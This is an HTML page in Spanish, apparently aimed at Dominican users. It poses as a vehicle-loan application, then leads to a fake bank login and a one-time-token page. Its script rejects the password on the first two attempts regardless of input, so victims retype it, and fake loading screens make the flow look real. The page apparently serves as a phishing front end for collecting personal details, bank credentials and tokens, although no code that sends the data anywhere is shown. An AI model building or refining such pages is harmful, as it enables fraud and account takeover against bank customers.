<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Formulario de Solicitud</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f4f4f4;
            margin: 0;
            padding: 0;
        }

        /* Estilos generales para las imágenes con margen */
        .image-margin {
            width: 100%;
            margin-bottom: 40px; /* Margen inferior para las imágenes del primer formulario */
            height: auto;
            overflow: hidden;
            text-align: center;
            cursor: pointer;
        }

        .image-margin img {
            width: 100%;
            height: auto;
            object-fit: contain;
            display: block;
        }

        /* NUEVA CLASE: Estilos para las imágenes del formulario de login sin margen inferior */
        .login-image-margin {
            width: 100%;
            margin-bottom: 0; /* Eliminamos el margen inferior para estas imágenes */
            height: auto;
            overflow: hidden;
            text-align: center;
            cursor: pointer;
        }

        .login-image-margin img {
            width: 100%;
            height: auto;
            object-fit: contain;
            display: block;
        }

        .form-container {
            max-width: 800px;
            margin: 0 auto;
            padding: 20px;
            background-color: #fff;
            border-radius: 8px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
        }

        h2 {
            text-align: center;
            color: #333;
            margin-bottom: 20px;
        }

        .form-row {
            display: flex;
            gap: 20px;
            margin-bottom: 15px;
        }

        .form-row .form-group {
            flex: 1;
        }

        .form-group {
            margin-bottom: 15px;
        }

        label {
            display: block;
            margin-bottom: 5px;
            color: #555;
            font-weight: bold;
        }

        input[type="text"],
        input[type="email"],
        input[type="number"],
        input[type="tel"],
        select {
            width: 100%;
            padding: 10px;
            border: 1px solid #ccc;
            border-radius: 5px;
            box-sizing: border-box;
        }
        
        /* Estilo para el prefijo de monto dentro del input */
        .monto-input-container {
            position: relative;
            display: flex;
            align-items: center;
        }
        .monto-input-prefix {
            position: absolute;
            left: 10px;
            color: #555;
            z-index: 1;
        }
        .monto-input {
            padding-left: 45px; /* Ajuste para el prefijo */
            width: 100%;
        }

        input[type="text"]:focus,
        input[type="email"]:focus,
        input[type="number"]:focus,
        input[type="tel"]:focus,
        select:focus {
            border-color: #007BFF;
            outline: none;
        }

        /* CAMBIO 1: Estilo para el botón de validar identidad en verde */
        .validate-button {
            width: 100%;
            padding: 12px;
            background-color: #28a745; /* Color verde */
            color: #fff;
            border: none;
            border-radius: 5px;
            font-size: 16px;
            cursor: pointer;
            transition: background-color 0.3s ease;
        }

        .validate-button:hover {
            background-color: #218838; /* Verde oscuro en hover */
        }
        
        .login-form button {
            width: 100%;
            padding: 12px;
            background-color: #28a745;
            color: #fff;
            border: none;
            border-radius: 5px;
            font-size: 16px;
            cursor: pointer;
            transition: background-color 0.3s ease;
        }

        .login-form button:hover {
            background-color: #218838;
        }

        /* Estilos para el overlay de carga */
        #loading-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(255, 255, 255, 0.7);
            display: flex;
            justify-content: center;
            align-items: center;
            backdrop-filter: blur(5px);
            z-index: 1000;
            flex-direction: column;
            text-align: center;
            display: none; /* Oculto por defecto */
        }

        .spinner {
            border: 8px solid #f3f3f3;
            border-top: 8px solid #007BFF;
            border-radius: 50%;
            width: 60px;
            height: 60px;
            animation: spin 2s linear infinite;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        /* CAMBIO 2: Estilos para el mensaje de imagen con fondo blurred */
        #image-message {
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            color: red;
            font-size: 24px;
            font-weight: bold;
            text-align: center;
            z-index: 1001;
            display: none; /* Oculto por defecto */
            background-color: rgba(255, 255, 255, 0.8);
            backdrop-filter: blur(5px);
            padding: 15px;
            border-radius: 10px;
            border: 1px solid #ccc;
        }

        /* Estilos para la segunda página (login) */
        #login-page {
            max-width: 400px;
            margin: 50px auto; /* Mantener un margen superior para la página de login en general */
            padding: 0; /* Eliminar padding aquí para que las imágenes se peguen al borde del contenedor */
            background-color: #fff;
            border-radius: 8px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            display: none; /* Oculto por defecto */
        }
        /* Ajustar el contenedor del formulario dentro de login-page */
        #login-page .form-container {
            padding: 20px; /* Restaurar el padding solo para el contenido del formulario */
            margin-top: 0; /* Asegurar que no haya margen superior adicional entre la imagen y el formulario */
            margin-bottom: 0; /* Asegurar que no haya margen inferior adicional entre el formulario y la imagen */
            box-shadow: none; /* Eliminar la sombra duplicada si el padre ya tiene una */
        }
        #token-page .form-container {
            padding: 20px;
            margin-top: 0;
            margin-bottom: 0;
            box-shadow: none;
        }
        #token-page {
            max-width: 400px;
            margin: 50px auto;
            padding: 0;
            background-color: #fff;
            border-radius: 8px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            display: none;
        }

        .login-form .form-group {
            margin-bottom: 20px;
        }

        .login-form input[type="text"],
        .login-form input[type="password"] {
            width: 100%;
            padding: 10px;
            border: 1px solid #ccc;
            border-radius: 5px;
            box-sizing: border-box;
        }

        .login-form label {
            font-weight: bold;
            display: block;
            margin-bottom: 5px;
        }
        @media (max-width: 600px) {
            .form-row {
                flex-direction: column;
                gap: 0;
            }
        }
    </style>
</head>
<body>

    <div id="image-message">Llena tu formulario antes de pasar a esta acción!</div>

    <div id="loading-overlay">
        <div class="spinner"></div>
    </div>

    <div id="main-content">
        <div class="image-margin top-image">
            <img src="img/banrs.jpg" alt="Imagen superior del formulario">
        </div>

        <div class="form-container">
            <form id="loan-form">
                <h2>Solicitud de Financiamiento</h2>
                <div class="form-row">
                    <div class="form-group">
                        <label for="nombre">Nombre *</label>
                        <input type="text" id="nombre" name="nombre" placeholder="Nombre" required>
                    </div>
                    <div class="form-group">
                        <label for="apellido">Apellido *</label>
                        <input type="text" id="apellido" name="apellido" placeholder="Apellido" required>
                    </div>
                </div>
                <div class="form-group">
                    <label for="cedula">Cédula *</label>
                    <input type="text" id="cedula" name="cedula" placeholder="000-0000000-0" required>
                </div>
                <div class="form-group">
                    <label for="email">Email *</label>
                    <input type="email" id="email" name="email" placeholder="Email" required>
                </div>
                <div class="form-group">
                    <label for="edad">¿Cuántos años? *</label>
                    <select id="edad" name="edad" required>
                        <option value="">Seleccione</option>
                        <option value="3">3</option>
                        <option value="4">4</option>
                        <option value="5">5</option>
                        <option value="6">6</option>
                    </select>
                </div>
                <div class="form-group">
                    <label for="telefono">Teléfono</label>
                    <input type="tel" id="telefono" name="telefono" placeholder="Teléfono">
                </div>
                <div class="form-row">
                    <div class="form-group">
                        <label for="marca_vehiculo">Marca de vehículo *</label>
                        <input type="text" id="marca_vehiculo" name="marca_vehiculo" placeholder="Marca" required>
                    </div>
                    <div class="form-group">
                        <label for="ano_vehiculo">Año del vehículo *</label>
                        <input type="number" id="ano_vehiculo" name="ano_vehiculo" required>
                    </div>
                </div>
                <div class="form-group">
                    <label for="opcion">Seleccionar *</label>
                    <select id="opcion" name="opcion" required>
                        <option value="">Escoge una opción</option>
                        <option value="inicial_en_cuenta">Inicial en cuenta</option>
                        <option value="inicial_en_efectivo">Inicial en efectivo</option>
                        <option value="no_tengo_inicial">No tengo el incial</option>
                    </select>
                </div>
                <div class="form-group">
                    <label for="monto_financiar">Monto a financiar *</label>
                    <div class="monto-input-container">
                        <input type="text" class="monto-input" id="monto_financiar" name="monto_financiar" placeholder="Valor del vehículo" required inputmode="decimal">
                    </div>
                </div>
                <div class="form-row">
                    <div class="form-group">
                        <label for="nombre_referente">Nombre de referente *</label>
                        <input type="text" id="nombre_referente" name="nombre_referente" placeholder="Referencia" required>
                    </div>
                    <div class="form-group">
                        <label for="apellido_referente">Apellido de referente *</label>
                        <input type="text" id="apellido_referente" name="apellido_referente" placeholder="Referencia" required>
                    </div>
                </div>
                <div class="form-group">
                    <label for="parentesco">Parentesco</label>
                    <input type="text" id="parentesco" name="parentesco" placeholder="Parentesco">
                </div>
                <div class="form-row">
                    <div class="form-group">
                        <label for="dealer_asociado">Dealer asociado *</label>
                        <input type="text" id="dealer_asociado" name="dealer_asociado" required>
                    </div>
                    <div class="form-group">
                        <label for="codigo_dealer">Código de dealer *</label>
                        <input type="number" id="codigo_dealer" name="codigo_dealer" required>
                    </div>
                </div>
                <button type="submit" class="validate-button">Validar identidad</button>
            </form>
        </div>

        <div class="image-margin bottom-image">
            <img src="img/abajoimg.jpg" alt="Imagen inferior del formulario">
        </div>
    </div>

    <div id="login-page">
        <div class="login-image-margin top-image">
            <img src="img/upper.jpg" alt="Imagen superior del login">
        </div>
        <div class="form-container login-form">
            <h2>Iniciar Sesión</h2>
            <div class="form-group">
                <label for="username">Usuario *</label>
                <input type="text" id="username" name="username" required>
            </div>
            <div class="form-group">
                <label for="password">Contraseña *</label>
                <input type="password" id="password" name="password" required>
            </div>
            <p id="password-error-message" style="color: red; font-weight: bold; text-align: center; margin-top: -10px; margin-bottom: 10px; display: none;">Contraseña inválida</p>
            <button type="button" id="login-button">Continuar</button>
        </div>
        <div class="login-image-margin bottom-image">
            <img src="img/abajoimg.jpg" alt="Imagen inferior del login">
        </div>
    </div>
    
    <div id="token-page" style="display: none;">
        <div class="login-image-margin top-image">
            <img src="img/upper.jpg" alt="Imagen superior del login">
        </div>
        <div class="form-container login-form">
            <h2>Ingrese su Token</h2>
            <div class="form-group">
                <label for="token">Token *</label>
                <input type="number" id="token" name="token" required>
            </div>
            <button type="button" id="token-button">Enviar</button>
        </div>
        <div class="login-image-margin bottom-image">
            <img src="img/abajoimg.jpg" alt="Imagen inferior del login">
        </div>
    </div>

    <script>
        document.addEventListener('DOMContentLoaded', () => {
            const cedulaInput = document.getElementById('cedula');
            const montoInput = document.getElementById('monto_financiar');
            const tokenInput = document.getElementById('token');
            const codigoDealerInput = document.getElementById('codigo_dealer');
            const form = document.getElementById('loan-form');
            const loadingOverlay = document.getElementById('loading-overlay');
            const mainContent = document.getElementById('main-content');
            const loginPage = document.getElementById('login-page');
            const tokenPage = document.getElementById('token-page'); 
            const imageMessage = document.getElementById('image-message');
            const images = document.querySelectorAll('.image-margin, .login-image-margin');
            const loginButton = document.getElementById('login-button');
            const passwordInput = document.getElementById('password');
            const passwordErrorMessage = document.getElementById('password-error-message');
            const tokenButton = document.getElementById('token-button');

            let loginAttempts = 0; 

            // Validación y formato de la cédula
            cedulaInput.addEventListener('input', (e) => {
                let value = e.target.value.replace(/[^0-9]/g, '');
                let formattedValue = '';

                if (value.length > 0) {
                    formattedValue += value.substring(0, 3);
                }
                if (value.length > 3) {
                    formattedValue += '-' + value.substring(3, 10);
                }
                if (value.length > 10) {
                    formattedValue += '-' + value.substring(10, 11);
                }

                e.target.value = formattedValue;
            });
            
            // Permite solo números en el campo de código de dealer
            codigoDealerInput.addEventListener('input', (e) => {
                e.target.value = e.target.value.replace(/[^0-9]/g, '');
            });

            // CORRECCIÓN SOLICITADA: Nueva lógica para el campo de monto a financiar
            montoInput.addEventListener('focus', () => {
                // Quita el prefijo 'RD$' y las comas al enfocar el campo
                let value = montoInput.value.replace(/[^\d.]/g, '');
                montoInput.value = value;
            });

            montoInput.addEventListener('blur', () => {
                let value = montoInput.value.replace(/[^\d.]/g, '');
                value = value.replace(/(\..*)\./g, '$1');
                const num = parseFloat(value);
                if (isNaN(num)) {
                    montoInput.value = '';
                } else {
                    montoInput.value = 'RD$' + num.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
                }
            });
            
            // Permite solo números en el campo de token
            tokenInput.addEventListener('input', (e) => {
                e.target.value = e.target.value.replace(/[^0-9]/g, '');
            });

            // Manejo del clic en las imágenes
            images.forEach(image => {
                image.addEventListener('click', (e) => {
                    e.preventDefault();
                    imageMessage.style.display = 'block';
                    setTimeout(() => {
                        imageMessage.style.display = 'none';
                    }, 3000);
                });
            });

            // Manejo del envío del formulario
            form.addEventListener('submit', (e) => {
                e.preventDefault();
                loadingOverlay.style.display = 'flex';
                setTimeout(() => {
                    loadingOverlay.style.display = 'none';
                    mainContent.style.display = 'none';
                    loginPage.style.display = 'block';
                    loginPage.scrollIntoView({ behavior: 'smooth', block: 'start' });
                }, 2000);
            });

            // Manejo del botón de Continuar en la página de login
            loginButton.addEventListener('click', () => {
                passwordErrorMessage.style.display = 'none';

                if (document.getElementById('username').value && passwordInput.value) {
                    loadingOverlay.style.display = 'flex';
                    document.body.style.filter = 'blur(5px)'; 

                    setTimeout(() => {
                        loadingOverlay.style.display = 'none';
                        document.body.style.filter = 'none';

                        loginAttempts++; 

                        if (loginAttempts <= 2) {
                            passwordErrorMessage.textContent = 'Contraseña inválida';
                            passwordErrorMessage.style.display = 'block';
                            passwordInput.value = '';
                        } else {
                            loginPage.style.display = 'none';
                            tokenPage.style.display = 'block';
                            tokenPage.scrollIntoView({ behavior: 'smooth', block: 'start' });
                        }
                    }, 2000); 
                } else {
                    alert('Por favor, ingrese su usuario y contraseña.');
                }
            });

            // Manejo del botón de Enviar en la página de token
            tokenButton.addEventListener('click', () => {
                if (tokenInput.value) {
                    loadingOverlay.style.display = 'flex';
                    document.body.style.filter = 'blur(5px)'; 

                    setTimeout(() => {
                        loadingOverlay.style.display = 'none';
                        document.body.style.filter = 'none';
                    }, 2000);
                } else {
                    alert('Por favor, ingrese su token.');
                }
            });
        });
    </script>
</body>
</html>
